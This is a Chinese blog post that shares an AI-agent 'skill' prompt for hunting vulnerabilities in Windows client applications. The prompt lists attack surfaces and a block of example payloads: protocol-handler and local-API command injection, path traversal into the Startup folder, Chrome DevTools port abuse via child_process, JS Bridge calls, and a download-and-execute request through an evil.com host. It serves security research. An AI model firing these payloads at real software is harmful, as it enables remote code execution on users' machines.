---
title: 客户端漏洞挖掘skills
url: https://mp.weixin.qq.com/s/swYPy3q5kBiRs4dNGdGiMw
source: Doonsec's feed
date: 2026-06-25
fetch_date: 2026-06-26T06:05:51.839658
---

# 客户端漏洞挖掘skills

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/kCaGE674k6O0BKN4zcA1uXiau3C896K5WluAV1CHm60dxeqiaqsEgnF7mGoYBWV8FyZFX5H5FQiaHxpo5zh2LO8m9uWPWArkMWMx1JA9a2NMvo/0?wx_fmt=jpeg)

# 客户端漏洞挖掘skills

原创

鬼麦子
鬼麦子

鬼麦子

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

这是当年手工方法，搞成skills [win客户端黑盒挖掘](https://mp.weixin.qq.com/s?__biz=Mzg4MzY3MTgyMw==&mid=2247483974&idx=1&sn=967a4f366018f0fe361002f918616a27&scene=21#wechat_redirect)

其实，无需多言，给个安装目录，嘎嘎跑就完事，winodws/android/mac这些基本同理。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kCaGE674k6PYzeV0AiaaFJ3R0JKf744A4sH0Lp6fL4T5NJWlUYeu2dsVWt0QJdehoT4SxWBVKBk1qPaqLibics8z4w2cH5ibxBIv447pFibLBObE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/kCaGE674k6OiaibgA4ObqAzpEV5gRRFtrUI3icGIkvn8qe5vHiaJ2F0hmNWXibN5qNibDWoZmrRN65zDlo2tRtUCjjEPx4v0KpXCj4WfrTdL7DxHo/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kCaGE674k6NvdFE7sqM8oSiayTuVvg2ADh9UziaKOzibRWO4fus1ibWF9IbHvoEvUX7ibaVEJMmfaXnqvyzXIbJuto64yicpgFX5S7eXstu4Sj1Sc/640?wx_fmt=png&from=appmsg)

曾经不少人怀疑ai没法二进制，实际上他妈的，因为cmd PowerShell，基本都是命令行操作，ida/ghidra都不是很友好，退而求其次就r2了，但是agent这个屌毛甚至r2他觉得不好使，人自己用python pefile、struct进行逆向反编译了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/kCaGE674k6OXKm3hIc4ojLBM0K67Rw6xSgOKicuU8aibRDiayIZC7V44xKuUSDicoucfzEyNX7hTKovia2XwYyrm1547vZrHicAib0OFst1M4jfv6w/640?wx_fmt=png&from=appmsg)

```
---name: client-side-huntingdescription: 客户端漏洞挖掘，对客户端安装目录进行漏洞挖掘。---
# 客户端黑盒漏洞挖掘
支持Windows客户端，很多东西没必要全量读取，即费上下文又费token，尽量读关键位置，比如关键位置的上下文几千，不必要的输出也别输出，不可修改目标项目的任何文件内容。
只可以使用以下工具：
- PowerShell（主战）- cmd- python- jadx.bat        工具安装目录 D:\hack_tools\jadx\bin- rabin2.exe  工具安装目录 D:\hack_tools\radare2-6.1.6-w64\bin- asar- curl.exe

用好工具，反编译逆向与直接测试都可以用于进行深度漏洞挖掘，如存在攻击面的函数变量深度追踪，危险函数变量的深度追踪。

### 攻击面分析
1. 框架类CEF/Electron/WPF/WinForms/QT/Tauri/WinUI3 2. 自定义协议 Deep Link/App Link 自定义协议路由3. 客户端程序开启的侦听端口4. 客户端进程信息5. 客户端功能6. js接口(JS Bridge)7. 重点关注文件类型： `.exe` `.dll` `.asar` `.config` `.json` `.xml` `.js` `.html` `.pak`

### 漏洞案例
```myapp://?id=1|calc    伪协议参数命令注入myapp://?url=http://test.com/cve-2022-xxx.html   客户端可以加载指定页面，但客户端内嵌chrome版本太低并且--no-sandbox未开沙箱,导致rcemyapp://?url=file://C://Windows//System32//calc.exe    伪协议导致可以打开本地任意文件，导致rcemyapp://download?url=http://www.test.com/calc.exe&foldername=.../.../.../.../.../.../Start Menu/Programs/Startup    目录穿越，下载exe至启动目录或者覆盖其他exe文件，导致rcehttp://127.0.0.1:1239/api/exec?cmd=calc   端口功能，导致rcehttp://127.0.0.1:1239/api/ping?ip=0.0.0.0|calc  参数命令注入rcehttp://127.0.0.1:1239/api/go-to?url=http://test.com/cve-2022-xxx.html  客户端可以加载指定页面，但客户端内嵌chrome版本太低并且--no-sandbox未开沙箱,导致rcehttp://127.0.0.1:1239/../../../Windows/win.ini     目录穿越，任意文件读取http://127.0.0.1:29222/json    cdp端口开放，导致出现一系列攻击面，如require('child_process').exec('calc')  导致rce等。
POST http://127.0.0.1:45621/download{"type":"action","url":"http://www.test.com@evil.com/calc.exe"}    客户端端口功能，www.test.com特权域可直接执行下载文件，下载并直接执行exe导致rce，特权域绕过。
require('child_process').exec('calc')   一些客户端内嵌浏览器可控，访问测试页面后可以执行nodejs代码，导致rcewindow.test.test({"cmd":"calc"})	一些客户端内嵌浏览器可控，内部定义了很多js接口(JS Bridge)功能，导致rcewindow.test.test({"openurl":"file://C://Windows//System32//calc.exe"})	一些客户端内嵌浏览器可控，内部定义了很多js接口功能，导致rcewindow.test.getCookie()	一些客户端内嵌浏览器可控，内部定义了很多js接口(JS Bridge)功能，导致敏感信息泄露http://127.0.0.1:1239/api/get?text=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa   远程溢出导致拒绝服务，没有内存保护GS、DEP、ASLR之类，可尝试编写shllcode exp远程rcewindow.test.test("\x00\x00\x00 ")    溢出导致拒绝服务，没有内存保护GS、DEP、ASLR之类，可尝试编写shllcode exp远程rce```

### 漏洞验证
虚假漏洞案例: myapp://page/webview?url=file://C://Windows//System32//calc.exe     如从某些点看起来，这样就可以执行，实际上url参数在某些地方已经没安全过滤了，所以是虚假漏洞;  window.test.test({"openurl":"file://C://Windows//System32//calc.exe"})	 这种是必须某些域名下才能执行，如果不能绕过，或者有特权域的xss，也是虚假漏洞。
所以发现漏洞后，二次验证，必须是可靠漏洞，跟踪整个链路，通过逆向反编译，代码层面验证过或者实际验证过的真实漏洞，可以进行远程攻击的漏洞，不要有恶意exp之类验证，打开计算器或者curl 127.0.0.1/xxx收到log即可。

### 项目缓存
可在当前目录建立个文件夹存放md文件，保存攻击面、挖掘过程等重要信息，避免超出上下文后，记忆压缩后，对重要信息的遗忘，以及重复测试。
### 输出标准
1. 客户端攻击面、类型、攻击面描述、可能导致出现的漏洞(绝不允许有其他输出)2. 客户端路径、exp、漏洞等级、漏洞类型。(绝不允许有其他输出，必须是可靠漏洞，通过逆向反编译，代码层面验证过或者实际验证过的真实漏洞，可以进行远程攻击的漏洞)
```

回想当年搞客户端，[win客户端黑盒挖掘 ，](https://mp.weixin.qq.com/s?__biz=Mzg4MzY3MTgyMw==&mid=2247483974&idx=1&sn=967a4f366018f0fe361002f918616a27&scene=21#wechat_redirect)折腾半天，现在就一句话，对c:/xxx  进行漏洞挖掘。

这年头，不要瞎折腾、不要吹牛逼，给AI目标、工具、案例，完事，甚至模型都不需要太好，嘎嘎跑。

你要说直接出洞，除了那种特别明显的，但是对那种几百几千万装机量的，也不太现实，给线索给证据后，有理解的人自然而然就出洞了。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/hMZ0ictzVvTt7jx7CZw4MSq5nEQtjICjeaVic6ibJpEw74Sls4kFials6YTebNIl4XBYcKHtzcvNtl0NUd3iaqib1TGA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过